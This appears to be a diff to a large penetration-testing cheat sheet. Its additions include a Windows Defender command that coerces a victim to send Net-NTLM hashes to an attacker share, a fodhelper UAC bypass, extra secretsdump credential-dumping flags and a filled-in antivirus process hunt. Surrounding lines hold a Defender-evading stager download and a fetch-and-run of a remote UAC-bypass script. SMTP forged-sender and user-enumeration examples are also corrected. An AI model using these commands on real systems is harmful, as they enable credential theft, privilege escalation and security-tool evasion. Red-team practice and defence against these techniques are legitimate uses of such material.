@@ -1298,6 +1298,12 @@ Download stager without triggering Defender to scan it:
 PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -Url http://127.0.0.1/met.exe -Path C:\Users\snovvcrash\music\met.exe
 ```
 
+Coerce the victim machine to reach the attacker (to steal Net-NTLM):
+
+```
+Cmd > C:\PROGRA~1\WINDOW~1\MpCmdRun.exe -Scan -ScanType 3 -File '\\10.10.13.37\share\file'
+```
+
 
 
 
@@ -1950,7 +1956,7 @@ rm delete_vol.txt
 Parse secrets:
 
 ```
-$ secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds ntds.dit LOCAL
+$ secretsdump.py [-pwd-last-set] [-user-status] [-history] -sam sam.hive -system system.hive -security security.hive -ntds ntds.dit LOCAL
 ```
 
 
@@ -3358,7 +3364,7 @@ Common AV process names:
 | tmlisten.exe | Trend Micro OfficeScan           |
 
 ```
-PS > gc .\100-hosts.txt | % {gwmi -Query "select * from Win32_Process" -ComputerName $_ | ? {$_.Caption -in "name1.exe","name2.exe"} | select ProcessName,PSComputerName}
+PS > gc .\100-hosts.txt | % {gwmi -Query "select * from Win32_Process" -ComputerName $_ | ? {$_.Caption -in "avp.exe","cpda.exe","MsMpEng.exe","ntrtscan.exe","tmlisten.exe"} | select ProcessName,PSComputerName}
 ```
 
 Identify Microsoft.NET version:
@@ -4968,7 +4974,7 @@ Check if sender could be [forged](https://en.wikipedia.org/wiki/Callback_verific
 ```
 $ telnet mail.example.com 25
 HELO example.com
-MAIL FROM: <forged@exmaple.com>
+MAIL FROM: <forged@example.com>
 RCPT TO: <exists@example.com>
 RCPT TO: <exists@gmail.com>
 ```
@@ -4988,8 +4994,8 @@ Check if domain users could be enumerated with `VRFY` and `EXPN`:
 ```
 $ telnet mail.example.com 25
 HELO example.com
-VRFY exists@exmaple.com
-EXPN exists@exmaple.com
+VRFY exists@example.com
+EXPN exists@example.com
 ```
 
 Check if users could be enumerated with `RCPT TO`:
@@ -4998,10 +5004,10 @@ Check if users could be enumerated with `RCPT TO`:
 $ telnet mail.example.com 25
 HELO example.com
 MAIL FROM: <...>
-RCPT TO: <exists@exmaple.com>
+RCPT TO: <exists@example.com>
 DATA
 From: <...>
-To: <exists@exmaple.com>
+To: <exists@example.com>
 Subject: Job offer
 Hello, I would like to offer you a great job!
 .
@@ -6423,6 +6429,17 @@ PS > cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 ```
 PS > IEX(New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/snovvcrash/362be57caaa167e7f5667156ac80f445/raw/1990959bc80b56179863aede06695bc499249744/Bypass-UAC.ps1')
 PS > Bypass-UAC -C "C:\Users\snovvcrash\music\met.exe"
+```
+
+
+
+
+## fodhelper
+
+```
+PS > New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value cmd.exe -Force
+PS > New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
+Cmd > fodhelper
 ```
 
 
